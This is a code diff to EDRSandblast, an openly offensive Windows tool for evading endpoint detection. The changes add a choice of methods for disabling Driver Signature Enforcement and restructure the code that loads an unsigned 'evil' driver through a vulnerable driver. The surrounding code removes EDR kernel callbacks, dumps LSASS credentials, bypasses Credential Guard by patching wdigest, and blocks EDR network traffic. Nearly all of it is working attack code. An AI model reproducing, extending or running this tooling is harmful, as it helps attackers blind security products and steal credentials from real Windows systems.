@@ -56,7 +56,7 @@ void PrintBanner() {
     const TCHAR edrsandblast[] = TEXT("  ______ _____  _____   _____                 _ _     _           _   \r\n |  ____|  __ \\|  __ \\ / ____|               | | |   | |         | |  \r\n | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_ \r\n |  __| | |  | |  _  / \\___ \\ / _` | \'_ \\ / _` | \'_ \\| |/ _` / __| __|\r\n | |____| |__| | | \\ \\ ____) | (_| | | | | (_| | |_) | | (_| \\__ | |_ \r\n |______|_____/|_|  \\_|_____/ \\__,_|_| |_|\\__,_|_.__/|_|\\__,_|___/\\__|\n");
     const TCHAR defcon[] = TEXT("D3FC0N 30 Edition");
     const TCHAR authors[2][256] = { TEXT("Thomas DIOT (@_Qazeer)"), TEXT("Maxime MEIGNAN (@th3m4ks)") };
-    
+
     srand((unsigned int)time(NULL));
     int r = rand() % 2;
 
@@ -94,6 +94,7 @@ int _tmain(int argc, TCHAR** argv) {
     [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--ci-offsets <CiOffsets.csv>] [--internet]\n\
     [--vuln-driver <RTCore64.sys>] [--vuln-service <SERVICE_NAME>] \n\
     [--unsigned-driver <evil.sys>] [--unsigned-service <SERVICE_NAME>] \n\
+    [--no-kdp]\n\
 [-o | --dump-output <DUMP_FILE>]\n");
     const TCHAR extendedUsage[] = TEXT("\n\
 -h | --help             Show this help message and exit.\n\
@@ -160,6 +161,7 @@ Driver sideloading options:\n\
 --unsigned-driver <evil.sys>            Path to the unsigned driver file.\n\
                                         Default to 'evil.sys' in the current directory.\n\
 --unsigned-service <SERVICE_NAME>       Name of the unsigned driver's service to intall / start.\n\
+--no-kdp                                Switch to g_CiOptions patching method for disabling DSE (default is callback swapping).\n\
 \n\
 \n\
 Offset-related options:\n\
@@ -198,6 +200,7 @@ Dump options:\n\
     TCHAR unsignedDriverPath[MAX_PATH] = { 0 };
     TCHAR driverDefaultName[] = DEFAULT_DRIVER_FILE;
     TCHAR evilDriverDefaultName[] = DEFAULT_EVIL_DRIVER_FILE;
+    enum dseDisablingMethods_e dseMethod = CALLBACK_SWAPPING;
     TCHAR ntoskrnlOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR wdigestOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR ciOffsetCSVPath[MAX_PATH] = { 0 };
@@ -290,6 +293,9 @@ Dump options:\n\
                 return EXIT_FAILURE;
             }
             SetEvilDriverServiceName(argv[i]);
+        }
+        else if (_tcsicmp(argv[i], TEXT("--no-kdp")) == 0) {
+            dseMethod = G_CIOPTIONS_PATCHING;
         }
         else if (_tcsicmp(argv[i], TEXT("--nt-offsets")) == 0) {
             i++;
@@ -536,14 +542,17 @@ Dump options:\n\
     }
 
     if (startMode != audit) {
-
+#ifdef _DEBUG
+        if (1) {
+#else
         if (isSafeToExecutePayloadKernelland && (isSafeToExecutePayloadUserland || directSyscalls)) {
+#endif
             _putts_or_not(TEXT("[+] Process is \"safe\" to launch our payload\n"));
 
             // Do the operation the tool was started for.
             switch (startMode) {
 
-            // Start a process executing cmd.exe.
+                // Start a process executing cmd.exe.
             case cmd:
                 _putts_or_not(TEXT("[+] Kernel callbacks have normally been removed, starting cmd.exe\n")
                     TEXT("WARNING: EDR kernel callbacks will be restored after exiting the cmd prompt (by typing exit)\n")
@@ -557,7 +566,7 @@ Dump options:\n\
                 _tsystem(cmdPath);
                 break;
 
-            // Dump the LSASS process in a new thread.
+                // Dump the LSASS process in a new thread.
             case dump:
                 if (kernelMode) {
                     if (g_ntoskrnlOffsets.st.eprocess_protection != 0x0) {
@@ -634,7 +643,7 @@ Dump options:\n\
                 }
                 break;
 
-            // Bypass Cred Guard (for new logins) by patching LSASS's wdigest module in memory.
+                // Bypass Cred Guard (for new logins) by patching LSASS's wdigest module in memory.
             case credguard:
                 if (_tcslen(wdigestOffsetCSVPath) == 0) {
                     TCHAR offsetCSVName[] = TEXT("\\WdigestOffsets.csv");
@@ -690,7 +699,7 @@ Dump options:\n\
                 }
                 break;
 
-            // Add firewall rules to block EDR network communications.
+                // Add firewall rules to block EDR network communications.
             case firewall:
             {
                 hrStatus = S_OK;
@@ -713,100 +722,75 @@ Dump options:\n\
             case load_unsigned_driver:
             {
                 if (_tcslen(ciOffsetCSVPath) == 0) {
-                    TCHAR CiOffsetCSVName[] = TEXT("\\CiOffsets.csv");
-                    _tcsncat_s(ciOffsetCSVPath, _countof(ciOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
-                    _tcsncat_s(ciOffsetCSVPath, _countof(ciOffsetCSVPath), CiOffsetCSVName, _countof(CiOffsetCSVName));
+                    PathAppend(ciOffsetCSVPath, currentFolderPath);
+                    PathAppend(ciOffsetCSVPath, TEXT("\\CiOffsets.csv"));
                 }
 
-                if (FileExists(ciOffsetCSVPath)) {
-                    LoadCiOffsetsFromFile(ciOffsetCSVPath);
-                    if (g_ciOffsets.st.g_CiOptions == 0x0) {
-                        _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of ci in use."));
-                    }
-                    else {
-                        if (verbose) {
-                            _tprintf_or_not(TEXT("[+] g_CiOptions offset found using %s file : 0x%llx\n"), ciOffsetCSVPath, g_ciOffsets.st.g_CiOptions);
-                        }
-                    }
-                }
+                BOOL ciOffsetsWereLoaded = LoadCiOffsets(ciOffsetCSVPath, internet);
 
-                if (internet && (g_ciOffsets.st.g_CiOptions == 0x0)) {
-                    _putts_or_not(TEXT("[+] Downloading ci related offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
-#if _DEBUG
-                    LoadCiOffsetsFromInternet(FALSE);
-#else
-                    LoadCiOffsetsFromInternet(TRUE);
-#endif
-                    if (g_ciOffsets.st.g_CiOptions == 0x0) {
-                        _putts_or_not(TEXT("[-] Downloading offsets from the internet failed !"));
-
-                    }
-                    else {
-                        _putts_or_not(TEXT("[+] Downloading offsets succeeded !"));
-                        if (FileExists(ciOffsetCSVPath)) {
-                            _putts_or_not(TEXT("[+] Saving them to the CSV file..."));
-                            SaveCiOffsetsToFile(ciOffsetCSVPath);
-                        }
-                    }
-                    if (verbose) {
-                        _tprintf_or_not(TEXT("[+] g_CiOptions offset found using internet MS Symbol Server : 0x%llx\n"), g_ciOffsets.st.g_CiOptions);
-                    }
-                }
-
-                if (g_ciOffsets.st.g_CiOptions == 0x0) {
+                if (!ciOffsetsWereLoaded) {
                     _putts_or_not(TEXT("[!] The offsets must be computed using the provided script and added to the offsets CSV file (or use --internet). Unsigned driver won't be loaded ...\n"));
                     lpExitCode = EXIT_FAILURE;
+                    break;
+                }
+
+                _putts_or_not(TEXT(""));
+                if (!kernelMode) {
+                    lpExitCode = EXIT_FAILURE;
+                    break;
+                }
+                if (_tcslen(unsignedDriverPath) == 0) {
+                    PathAppend(unsignedDriverPath, currentFolderPath);
+                    PathAppend(unsignedDriverPath, evilDriverDefaultName);
+                }
+                if (!FileExists(unsignedDriverPath)) {
+                    _tprintf_or_not(TEXT("[!] Required driver file not present at %s\nExiting...\n"), unsignedDriverPath);
+                    lpExitCode = EXIT_FAILURE;
+                    break;
+                }
+
+                BOOL ciWasEnabled = IsCiEnabled();
+                if (ciWasEnabled)
+                {
+                    BOOL disablingWasSuccessful = disableDSE(dseMethod, verbose);
+                    if (!disablingWasSuccessful) {
+                        _putts_or_not(TEXT("[-] DSE could not have been disabled, aborting ...\n"));
+                        lpExitCode = EXIT_FAILURE;
+                        break;
+                    }
+                    _putts_or_not(TEXT("[+] DSE is now disabled"));
                 }
                 else {
-                    _putts_or_not(TEXT(""));
-                    if (kernelMode) {
-                        DWORD64 CiBaseAddress = 0;
-                        DWORD64 g_CiOptionsAddress = 0;
-                        if (IsCiEnabled())
-                        {
-                            CiBaseAddress = FindCIBaseAddress();
-                            if (!CiBaseAddress) {
-                                _putts_or_not(TEXT("[-] CI base address not found !\n"));
-                            }
-                            else {
-                                g_CiOptionsAddress = CiBaseAddress + g_ciOffsets.st.g_CiOptions;
-                                if (verbose)
-                                    _tprintf_or_not(TEXT("[+] CI.dll kernel base address found at 0x%llx. The g_CiOptions is at %llx !\n"), CiBaseAddress, g_CiOptionsAddress);
-                                if (_tcslen(unsignedDriverPath) == 0) {
-                                    PathAppend(unsignedDriverPath, currentFolderPath);
-                                    PathAppend(unsignedDriverPath, evilDriverDefaultName);
-                                }
-                                if (!FileExists(unsignedDriverPath)) {
-                                    _tprintf_or_not(TEXT("[!] Required driver file not present at %s\nExiting...\n"), unsignedDriverPath);
-                                    return EXIT_FAILURE;
-                                }
-                                _putts_or_not(TEXT("[+] Using the vulnerable driver to disable CI..."));  // debug print
-                                ULONG CiOptionsValue = 0;
-                                ULONG OldCiOptionsValue;
-                                patch_gCiOptions(g_CiOptionsAddress, CiOptionsValue, &OldCiOptionsValue);
-                                LPTSTR evilServiceNameIfAny = NULL;
-                                BOOL isEvilDriverAlreadyRunning = IsDriverServiceRunning(unsignedDriverPath, &evilServiceNameIfAny);
-                                if (isEvilDriverAlreadyRunning) {
-                                    _putts_or_not(TEXT("[+] Evil driver is already running!\n"));
-                                    SetEvilDriverServiceName(evilServiceNameIfAny);
-                                }
-                                else {
-                                    _putts_or_not(TEXT("[+] Installing evil driver..."));
-                                    status = InstallEvilDriver(unsignedDriverPath);
-                                    if (status != TRUE)
-                                        _putts_or_not(TEXT("[!] An error occurred while installing the evil driver"));
-                                }
-                                _putts_or_not(TEXT("[+] Using the vulnerable driver to reset original CI status"));  // debug print
-                                patch_gCiOptions(g_CiOptionsAddress, OldCiOptionsValue, &OldCiOptionsValue);
-                            }
-                        }
-                        else {
-                            // CI is already disabled, just load the driver
-                            // TODO FIX : logic error, evil driver is not loadded if DSE is already disabled
-                            _putts_or_not(TEXT("[-] CI is already disabled!\n")); // debug print
-                        }
+                    _putts_or_not(TEXT("[-] CI is already disabled!\n"));
+                }
+
+
+                LPTSTR evilServiceNameIfAny = NULL;
+                BOOL isEvilDriverAlreadyRunning = IsDriverServiceRunning(unsignedDriverPath, &evilServiceNameIfAny);
+                if (isEvilDriverAlreadyRunning) {
+                    _putts_or_not(TEXT("[+] Evil driver is already running!\n"));
+                    SetEvilDriverServiceName(evilServiceNameIfAny);
+                }
+                else {
+                    _putts_or_not(TEXT("[+] Installing evil driver..."));
+                    status = InstallEvilDriver(unsignedDriverPath);
+                    if (status != TRUE) {
+                        _putts_or_not(TEXT("[!] An error occurred while installing the evil driver"));
+                        lpExitCode = EXIT_FAILURE;
+                        break;
                     }
                 }
+                if (ciWasEnabled) {
+                    BOOL reenablingWasSuccessful = reenableDSE(dseMethod, verbose);
+                    if (!reenablingWasSuccessful) {
+                        _putts_or_not(TEXT("[-] DSE could not have been re-enabled; WARNING: this might trigger a PatchGuard BSoD in the following minutes...\n"));
+                        lpExitCode = EXIT_FAILURE;
+                        break;
+                    }
+                    _putts_or_not(TEXT("[+] DSE is enabled again"));
+
+                }
+
                 break;
             }
             }
